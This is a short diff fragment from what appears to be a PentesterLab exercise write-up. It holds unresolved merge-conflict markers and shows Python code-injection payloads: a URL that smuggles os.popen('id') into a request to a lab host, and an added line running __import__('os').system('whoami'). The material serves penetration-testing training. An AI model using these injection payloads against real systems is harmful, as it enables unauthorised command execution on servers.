@@ -20,3 +20,11 @@ http://ptl-011538e1-1c7c92d0.libcurl.so/hello/hacker%60%22%2bos.popen('id').read
 
 ![image](https://github.com/r1skkam/PentesterLab-Exercises/assets/58542375/c3d65a95-8137-43cd-9c40-54baabf41164)
 
+<<<<<<< HEAD
+=======
+```
+__import__('os').system('whoami')
+```
+
+![image](https://github.com/r1skkam/OffSec-PEN-200-OSCP-Preparation/assets/58542375/f4b223ac-f645-4cef-a88f-a75a3b92399e)
+>>>>>>> origin/main
